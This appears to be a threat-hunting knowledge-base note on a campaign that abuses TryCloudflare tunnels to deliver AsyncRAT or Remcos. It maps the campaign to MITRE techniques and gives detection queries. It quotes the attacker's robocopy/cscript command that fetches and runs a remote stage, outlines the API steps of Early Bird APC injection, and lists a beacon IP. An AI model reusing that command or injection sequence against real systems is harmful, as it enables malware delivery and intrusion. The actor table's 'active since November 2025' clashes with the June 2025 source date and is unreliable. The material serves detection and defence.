---
title: TryCloudflare Tunnel Abuse for RAT Delivery
date: 2026-08-21
type: ttp
mitre_id: T1566.001, T1204.002, T1027.012, T1036, T1218, T1059.003, T1059.006, T1055, T1620, T1547.001, T1572, T1071.001, T1041
mitre_tactic: Initial Access, Execution, Persistence, Defense Evasion, Command and Control, Exfiltration
threat_actors: [Unattributed (SERPENTINE#CLOUD cluster)]
tools_used: [TryCloudflare (cloudflared), WebDAV, cscript.exe, PowerShell, Kramer (Python obfuscator), Donut, Early Bird APC Injection]
platforms: [Windows]
tags:
  - type/ttp
  - status/active
  - platform/windows
  - category/rat
  - category/defense-evasion
source:
  url: https://www.securonix.com/blog/analyzing_serpentinecloud-threat-actors-abuse-cloudflare-tunnels-threat-research/
  author: Tim Peck (Securonix Threat Research)
  date: 2025-06-18
---

## Summary
Threat actors abuse Cloudflare's free `trycloudflare.com` tunnel service as a disposable, trusted-infrastructure delivery layer for a multi-stage phishing-to-RAT infection chain. Because tunnel subdomains are randomly generated, rotate frequently, and sit behind Cloudflare's own TLS certificates, this technique lets attackers avoid registering domains or renting VPS infrastructure while evading domain-reputation and DPI-based defenses. Best documented in the SERPENTINE#CLOUD campaign (Securonix, June 2025), which chains LNK → WSF → BAT → Python → Donut-packed shellcode to deliver AsyncRAT/Remcos entirely in memory.

## How It Works

### Step 1 — Phishing Lure (T1566.001, T1204.002)
- Victim receives an email themed around invoices/payments with a ZIP attachment (e.g. `Online-wire-confirmation-receipt846752.zip`)
- ZIP contains a `.lnk` file disguised as a PDF via a custom icon and hidden extension (e.g. `Bell-Invoice.pdf.lnk`) — T1027.012 LNK Icon Smuggling

### Step 2 — Tunnel-Based Stage 2 Retrieval (T1572, T1218)
- The LNK executes: `cmd.exe /c robocopy "\\[subdomain].trycloudflare[.]com@SSL\DavWWWRoot\..." %temp% tank.wsf /ns /nc /nfl /ndl & start /min "" cscript.exe //nologo "%temp%\tank.wsf"`
- Pulls the next stage over WebDAV-over-HTTPS from an attacker-controlled `trycloudflare.com` subdomain — Cloudflare's tunnel infrastructure functions as protocol tunneling (T1572) for what is effectively an anonymous file drop
- `cscript.exe` (a trusted system binary) executes the retrieved `.wsf` silently — T1218 System Binary Proxy Execution

### Step 3 — Obfuscated Batch Orchestration (T1027, T1036)
- The WSF pulls a second-stage batch file (`kiki.bat`) from a *different* tunnel subdomain — each stage uses fresh, disposable infrastructure
- `kiki.bat` is UTF-16LE encoded with variable-substitution obfuscation, making it unreadable in standard editors
- Performs: hidden PowerShell relaunch, decoy-PDF opening (masquerading legitimacy — T1036), AV process check via `tasklist` (branches payload set if `AvastUI.exe`/`avgui.exe` found), payload ZIP download, Python execution, Startup-folder persistence drop

### Step 4 — Kramer-Obfuscated Python Loader (T1059.006, T1027)
- Multiple layered Python files (`run.py`, `Jun02_*.py`, `Wsandy*.py`/`Okwan*.py` depending on the AV-check branch) obfuscated with the Kramer tool: alphanumeric shift mapping, bytewise shift with a brute-forceable key, newline substitution, and hex line encoding
- `run.py` decrypts shellcode via XOR using a companion key file (`a.txt`)

### Step 5 — Early Bird APC Process Injection (T1055, T1620)
- Spawns a legitimate process (typically `notepad.exe`) suspended via `CreateProcessA` with `CREATE_SUSPENDED`
- Allocates memory in the target with `VirtualAllocEx`, writes decrypted shellcode via `WriteProcessMemory`
- Queues an APC with `QueueUserAPC`, then `ResumeThread` — the shellcode executes via the APC queue *before* the process's own entry point runs, ahead of most userland EDR hooks
- Shellcode is Donut-packed (T1620 Reflective Code Loading), meaning the final RAT payload is loaded reflectively in memory and never written to disk

### Step 6 — Persistence (T1547.001)
- Drops `pws1.vbs` (infinite `SendKeys "+"` loop — prevents idle/lock/sleep, keeping the implant's beacon alive), `PWS.vbs` (re-triggers the full infection chain), and `startuppp.bat` (conditional relaunch checking an AV-detected flag) into the user's Startup folder
- On next login, the chain re-executes without requiring the user to re-open the original phishing attachment

### Step 7 — C2 and Exfiltration (T1071.001, T1041)
- Delivered RATs (AsyncRAT, Remcos observed) beacon to attacker infrastructure over standard web protocols (observed beacon: `51.89.212[.]145:7878`)
- Capabilities include password theft, browser/session data exfiltration, and lateral movement staging

## Detection Opportunities

### Key Log Sources
- **Email/attachment gateway:** ZIP attachments containing `.lnk` files with mismatched extensions/icons
- **Endpoint telemetry (EDR):** `robocopy` process creation with `trycloudflare[.]com@SSL\DavWWWRoot` in the command line; `cscript.exe` executing `.wsf` files from `%TEMP%`; `python.exe` executing from non-standard (user-profile) paths; suspended-process network connections (`notepad.exe` originating outbound traffic)
- **PowerShell logging:** `-WindowStyle Hidden` invocations chained from batch files
- **Windows Event Log:** New file creation in the Startup folder (`.vbs`, `.bat`)
- **Network/DNS:** Queries to `*.trycloudflare[.]com` from endpoints that have no legitimate Cloudflare Tunnel business use

### Behavioral Indicators
- `cmd.exe` spawning `robocopy` targeting a WebDAV path under a `trycloudflare[.]com` subdomain
- A UTF-16LE-encoded `.bat` file with dense variable-substitution obfuscation
- `python.exe` running from `%TEMP%`, `%APPDATA%`, or another non-installation directory
- A commonly-abused legitimate process (`notepad.exe`) created in a suspended state and shortly after establishing an outbound network connection — Early Bird APC injection signature
- Multiple `.vbs`/`.bat` files appearing in the user's Startup folder within a short time window

### Artifacts Left Behind
- `%TEMP%\tank.wsf` (or similarly-named `.wsf`)
- `C:\Users\<user>\Contacts\Extracted` and `C:\Users\<user>\Contacts\Print` staging directories
- `~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\pws1.vbs`, `PWS.vbs`, `startuppp.bat`
- File hashes and beacon IP/domains documented in [[Malware & TTPs/TryCloudflare Tunnel Abuse for RAT Delivery - Research Extraction]]

## Query Stubs

### CrowdStrike FQL

```
// robocopy pulling payloads over a trycloudflare.com WebDAV tunnel
#repo=base_sensor #event_simpleName=ProcessRollup2
| ImageFileName=/robocopy/i
| CommandLine=/trycloudflare\.com@SSL\\DavWWWRoot/i
| select(Timestamp, ComputerName, UserName, CommandLine)
| sort(-Timestamp)
```

```
// cscript.exe executing a .wsf from %TEMP%
#repo=base_sensor #event_simpleName=ProcessRollup2
| ImageFileName=/cscript\.exe/i
| CommandLine=/\\AppData\\Local\\Temp\\.*\.wsf/i
| select(Timestamp, ComputerName, UserName, CommandLine, ParentBaseFileName)
| sort(-Timestamp)
```

```
// python.exe executing from a non-standard (user profile) path
#repo=base_sensor #event_simpleName=ProcessRollup2
| ImageFileName=/python\.exe/i
| !FileName=/(C:\\Python|\\Program Files\\|\\AppData\\Local\\Programs\\Python)/i
| select(Timestamp, ComputerName, UserName, FileName, CommandLine)
| sort(-Timestamp)
```

```
// Suspended common process (notepad.exe) initiating outbound network activity — Early Bird APC signature
#repo=base_sensor #event_simpleName=/(ProcessRollup2|NetworkConnectIP4)/
| ImageFileName=/notepad\.exe/i
| select(Timestamp, ComputerName, UserName, ImageFileName, RemoteAddressIP4, RemotePort)
| sort(-Timestamp)
```

```
// DNS queries to trycloudflare.com subdomains
#repo=base_sensor #event_simpleName=DnsRequest
| DomainName=/\.trycloudflare\.com$/i
| select(Timestamp, ComputerName, UserName, ImageFileName, DomainName)
| sort(-Timestamp)
```

### Databricks SQL

```sql
-- robocopy pulling payloads over a trycloudflare.com WebDAV tunnel
SELECT
  timestamp,
  device_id,
  computer_name,
  user_name,
  command_line
FROM crowdstrike.process_events
WHERE image_file_name RLIKE '.*robocopy.*'
  AND command_line RLIKE '.*trycloudflare\\.com@SSL\\\\DavWWWRoot.*'
ORDER BY timestamp DESC
LIMIT 500;
```

```sql
-- cscript.exe executing a .wsf from %TEMP%
SELECT
  timestamp,
  device_id,
  computer_name,
  user_name,
  command_line,
  parent_base_file_name
FROM crowdstrike.process_events
WHERE image_file_name RLIKE '.*cscript\\.exe'
  AND command_line RLIKE '.*\\\\AppData\\\\Local\\\\Temp\\\\.*\\.wsf'
ORDER BY timestamp DESC
LIMIT 500;
```

```sql
-- python.exe executing from a non-standard path
SELECT
  timestamp,
  device_id,
  computer_name,
  user_name,
  file_name,
  command_line
FROM crowdstrike.process_events
WHERE image_file_name RLIKE '.*python\\.exe'
  AND file_name NOT RLIKE '.*(C:\\\\Python|Program Files|AppData\\\\Local\\\\Programs\\\\Python).*'
ORDER BY timestamp DESC
LIMIT 500;
```

```sql
-- DNS queries to trycloudflare.com subdomains
SELECT
  timestamp,
  device_id,
  computer_name,
  user_name,
  image_file_name,
  domain_name
FROM crowdstrike.dns_events
WHERE domain_name RLIKE '.*\\.trycloudflare\\.com$'
ORDER BY timestamp DESC
LIMIT 500;
```

## Threat Actor Usage

| Actor | Notes |
|---|---|
| Unattributed (SERPENTINE#CLOUD cluster) | Securonix assesses no named attribution; code comments suggest a fluent/native English speaker and possible LLM-assisted development. Active since at least November 2025, targeting primarily Western organizations (US, UK, Germany confirmed). |

## References
- [Analyzing SERPENTINE#CLOUD: Threat Actors Abuse Cloudflare Tunnels — Securonix Threat Research (Tim Peck, 2025-06-18)](https://www.securonix.com/blog/analyzing_serpentinecloud-threat-actors-abuse-cloudflare-tunnels-threat-research/)
- [New Malware Campaign Uses Cloudflare Tunnels to Deliver RATs via Phishing Chains — The Hacker News](https://thehackernews.com/2025/06/new-malware-campaign-uses-cloudflare.html)

## Related Notes
- [[Malware & TTPs/TryCloudflare Tunnel Abuse for RAT Delivery - Research Extraction]]
- [[20 - Areas/Threat Hunting/Hunt - TryCloudflare Tunnel Abuse for RAT Delivery]]
- [[Attack Techniques/Cloudflare Workers Dead-Drop Resolver C2]] — related Cloudflare-infrastructure-abuse technique using Workers instead of Tunnels for C2 resolution
